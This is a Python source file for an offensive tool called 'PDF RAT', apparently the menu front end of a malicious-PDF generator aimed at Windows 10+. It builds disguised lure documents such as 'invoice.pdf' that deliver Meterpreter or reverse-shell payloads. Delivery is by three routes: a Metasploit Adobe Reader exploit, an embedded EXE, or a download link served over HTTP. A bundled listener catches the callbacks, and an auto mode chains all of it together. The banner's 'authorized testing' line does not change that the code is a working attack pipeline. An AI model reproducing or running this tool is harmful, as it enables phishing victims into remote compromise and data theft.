#!/usr/bin/env python3

import os
import sys
import signal
import shutil
import threading

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

from modules.payload_builder import list_payloads, build_payload, PAYLOADS
from modules.pdf_builder import generate_custom_pdf, generate_simple_pdf_with_link, LURE_TEMPLATES
from modules.metasploit_pdf import generate_adobe_resource_script, generate_adobe_pdf_exploit
from modules.listener import generate_rc, start_listener, stop_listener
from modules.server import serve_file, get_local_ip

CFG = {
    "lhost": None,
    "lport": 4444,
    "payload_id": "1",
    "lure_id": "1",
    "output_name": "invoice.pdf",
    "method": "1"
}

PAYLOAD_MAP = {
    "1": ("windows/x64/meterpreter/reverse_tcp", "x64 Meterpreter"),
    "2": ("windows/meterpreter/reverse_tcp", "x86 Meterpreter"),
    "3": ("windows/x64/meterpreter_reverse_tcp", "x64 Stageless"),
    "4": ("windows/meterpreter_reverse_tcp", "x86 Stageless"),
    "5": ("windows/x64/shell_reverse_tcp", "x64 Shell"),
    "6": ("windows/shell_reverse_tcp", "x86 Shell"),
}

METHODS = {
    "1": ("Adobe Reader Exploit (Metasploit)", "Uses exploit/windows/fileformat/adobe_pdf_embedded_exe"),
    "2": ("Custom PDF + Embedded EXE", "Creates lure PDF with embedded payload using reportlab"),
    "3": ("PDF + Download Link", "PDF with clickable link to download payload from HTTP server"),
}


def signal_handler(sig, frame):
    print("\n[!] Interrupted")
    stop_listener()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def clear():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    clear()
    print("""
╔══════════════════════════════════════════════╗
║           PDF RAT v1.0 - Kali Linux          ║
║   Windows 10+ Exploit via Malicious PDF      ║
║        Authorized Penetration Testing Only   ║
╚══════════════════════════════════════════════╝
""")


def print_config():
    lhost = CFG["lhost"] or "NOT SET"
    pname = PAYLOAD_MAP.get(CFG["payload_id"], ["unknown"])[1]
    mname = METHODS.get(CFG["method"], ["unknown"])[0]
    lname = LURE_TEMPLATES.get(CFG["lure_id"], {}).get("title", "N/A")
    print(f" LHOST: {lhost}          LPORT: {CFG['lport']}")
    print(f" Payload: {pname} ({CFG['payload_id']})")
    print(f" Method: {mname} ({CFG['method']})")
    print(f" Lure: {lname} ({CFG['lure_id']})")
    print(f" Output: {CFG['output_name']}")
    print()


def show_menu():
    print_banner()
    print_config()

    print("┌─────────────────────────────────────────────┐")
    print("│  [1]  Generate PDF Payload                   │")
    print("│  [2]  Select Exploit Method                  │")
    print("│  [3]  Select Payload Type                    │")
    print("│  [4]  Configure LHOST / LPORT                │")
    print("│  [5]  Select Lure Template                   │")
    print("│  [6]  Set Output Filename                    │")
    print("│  [7]  Start Metasploit Listener              │")
    print("│  [8]  Stop Listener                          │")
    print("│  [9]  Serve PDF via HTTP                     │")
    print("│  [A]  Auto Mode (All-in-One)                 │")
    print("│  [Q]  Quit                                   │")
    print("└─────────────────────────────────────────────┘")


def cmd_generate_pdf():
    lhost = CFG["lhost"]
    if not lhost:
        print("[x] Set LHOST first (option 4)")
        input("Press Enter...")
        return

    p = PAYLOAD_MAP.get(CFG["payload_id"])
    if not p:
        print("[x] Invalid payload selected")
        input("Press Enter...")
        return

    payload_name = p[0]
    method = CFG["method"]
    output_name = CFG["output_name"]

    if method == "1":
        print("[*] Method: Adobe Reader Exploit (Metasploit)")
        print("[*] This will run msfconsole to generate the PDF")
        rc = generate_adobe_resource_script(payload_name, lhost, CFG["lport"], output_name)
        if rc:
            print("[*] Running Metasploit PDF exploit...")
            result = generate_adobe_pdf_exploit(payload_name, lhost, CFG["lport"], output_name)
            if result:
                print(f"[+] SUCCESS: {result}")
            else:
                print("[!] Adobe Reader exploit failed. Try Method 2 (Custom PDF).")

    elif method == "2":
        print("[*] Method: Custom PDF + Embedded EXE")
        pay_path = build_payload(CFG["payload_id"], lhost, CFG["lport"], "payload.exe")
        if pay_path:
            result = generate_custom_pdf(pay_path, lhost, CFG["lport"], output_name, CFG["lure_id"])
            if result:
                print(f"[+] SUCCESS: {result}")
            else:
                print("[!] Custom PDF generation failed")
        else:
            print("[x] Payload build failed")

    elif method == "3":
        print("[*] Method: PDF + Download Link")
        ip = lhost if lhost else get_local_ip()
        port = CFG["lport"] + 1
        payload_url = f"http://{ip}:{port}/payload.exe"
        result = generate_simple_pdf_with_link(payload_url, output_name, CFG["lure_id"])
        if result:
            print(f"[+] SUCCESS: {result}")
            print(f"[*] Remember to: (1) Build payload, (2) Start HTTP server on port {port}")
            print(f"[*] The PDF contains a link to: {payload_url}")

    input("\nPress Enter...")


def cmd_select_method():
    print("\n[ EXPLOIT METHODS ]")
    for k, v in METHODS.items():
        print(f"  {k}. {v[0]}")
        print(f"     {v[1]}")
    print()
    choice = input(f"Select method [{CFG['method']}]: ").strip()
    if choice in METHODS:
        CFG["method"] = choice
        print(f"[+] Method set to: {METHODS[choice][0]}")
    else:
        print(f"[!] Invalid, keeping: {METHODS[CFG['method']][0]}")
    input("Press Enter...")


def cmd_select_payload():
    list_payloads()
    choice = input(f"Select payload [{CFG['payload_id']}]: ").strip()
    if choice in PAYLOADS:
        CFG["payload_id"] = choice
        print(f"[+] Payload: {PAYLOADS[choice]['name']}")
    else:
        print(f"[!] Invalid, keeping: {PAYLOADS[CFG['payload_id']]['name']}")
    input("Press Enter...")


def cmd_configure():
    print("\n[ CONFIGURATION ]")
    print(f" Current LHOST: {CFG['lhost'] or 'NOT SET'}")
    print(f" Current LPORT: {CFG['lport']}")
    print()
    lhost = input("LHOST (IP): ").strip()
    if lhost:
        CFG["lhost"] = lhost
    lport = input(f"LPORT [{CFG['lport']}]: ").strip()
    if lport.isdigit():
        CFG["lport"] = int(lport)
    print(f"[+] LHOST={CFG['lhost']}  LPORT={CFG['lport']}")
    input("Press Enter...")


def cmd_select_lure():
    print("\n[ LURE TEMPLATES ]")
    for k, v in LURE_TEMPLATES.items():
        print(f"  {k}. {v['title']}")
    print()
    choice = input(f"Select lure [{CFG['lure_id']}]: ").strip()
    if choice in LURE_TEMPLATES:
        CFG["lure_id"] = choice
        print(f"[+] Lure: {LURE_TEMPLATES[choice]['title']}")
    else:
        print(f"[!] Invalid, keeping: {LURE_TEMPLATES[CFG['lure_id']]['title']}")
    input("Press Enter...")


def cmd_set_output():
    print(f"\n Current output: {CFG['output_name']}")
    name = input("New filename (e.g., invoice.pdf): ").strip()
    if name:
        if not name.lower().endswith(".pdf"):
            name += ".pdf"
        CFG["output_name"] = name
        print(f"[+] Output: {CFG['output_name']}")
    input("Press Enter...")


def cmd_start_listener():
    p = PAYLOAD_MAP.get(CFG["payload_id"])
    if not p:
        print("[x] Select a valid payload first")
        input("Press Enter...")
        return
    if not CFG["lhost"]:
        print("[x] Set LHOST first")
        input("Press Enter...")
        return

    rc = generate_rc(p[0], CFG["lhost"], CFG["lport"])
    print("[*] Starting listener...")
    print("[*] Press Ctrl+C to stop listener")
    start_listener(rc)


def cmd_stop_listener():
    stop_listener()
    input("Press Enter...")


def cmd_serve():
    port = input("HTTP port [8080]: ").strip() or "8080"
    try:
        port = int(port)
    except:
        port = 8080

    # Also build payload for download method
    if CFG["method"] == "3" and CFG["lhost"]:
        build_payload(CFG["payload_id"], CFG["lhost"], CFG["lport"], "payload.exe")

    serve_file(port)


def cmd_auto_mode():
    lhost = CFG["lhost"]
    if not lhost:
        print("[x] Set LHOST first (option 4)")
        input("Press Enter...")
        return

    print_banner()
    print("[*] === AUTO MODE ===")
    print(f"[*] Target: Windows 10+ via {METHODS.get(CFG['method'], ['PDF'])[0]}")

    if CFG["method"] == "1":
        print("[*] Generating Adobe Reader PDF exploit...")
        p = PAYLOAD_MAP.get(CFG["payload_id"])
        result = generate_adobe_pdf_exploit(p[0], lhost, CFG["lport"], CFG["output_name"])
        if not result:
            print("[!] Adobe exploit failed, falling back to method 2")
            pay_path = build_payload(CFG["payload_id"], lhost, CFG["lport"], "payload.exe")
            if pay_path:
                result = generate_custom_pdf(pay_path, lhost, CFG["lport"], CFG["output_name"], CFG["lure_id"])

    elif CFG["method"] == "2":
        print("[*] Building payload...")
        pay_path = build_payload(CFG["payload_id"], lhost, CFG["lport"], "payload.exe")
        if pay_path:
            print("[*] Generating custom PDF with embedded payload...")
            result = generate_custom_pdf(pay_path, lhost, CFG["lport"], CFG["output_name"], CFG["lure_id"])
        else:
            result = None

    elif CFG["method"] == "3":
        print("[*] Building payload for download...")
        pay_path = build_payload(CFG["payload_id"], lhost, CFG["lport"], "payload.exe")
        ip = lhost
        port = CFG["lport"] + 1
        payload_url = f"http://{ip}:{port}/payload.exe"
        result = generate_simple_pdf_with_link(payload_url, CFG["output_name"], CFG["lure_id"])

    if result:
        print(f"\n[+] PDF generated: {result}")
        print(f"[*] File size: {os.path.getsize(result)/1024:.1f} KB")

    print("\n[*] Starting Metasploit listener...")
    p = PAYLOAD_MAP.get(CFG["payload_id"])
    rc = generate_rc(p[0], lhost, CFG["lport"])
    print("[*] Listener ready. Use option 9 to serve PDF via HTTP.")
    print(f"[*] PDF location: {result}")

    input("\nPress Enter to start listener or Ctrl+C to abort...")
    start_listener(rc)


def main():
    while True:
        show_menu()
        choice = input("\nSelect option: ").strip().upper()

        actions = {
            "1": cmd_generate_pdf,
            "2": cmd_select_method,
            "3": cmd_select_payload,
            "4": cmd_configure,
            "5": cmd_select_lure,
            "6": cmd_set_output,
            "7": cmd_start_listener,
            "8": cmd_stop_listener,
            "9": cmd_serve,
            "A": cmd_auto_mode,
        }

        if choice == "Q":
            stop_listener()
            print("[+] Exiting. Stay legal.")
            break
        elif choice in actions:
            actions[choice]()
        else:
            print("[!] Invalid option")
            input("Press Enter...")


if __name__ == "__main__":
    main()
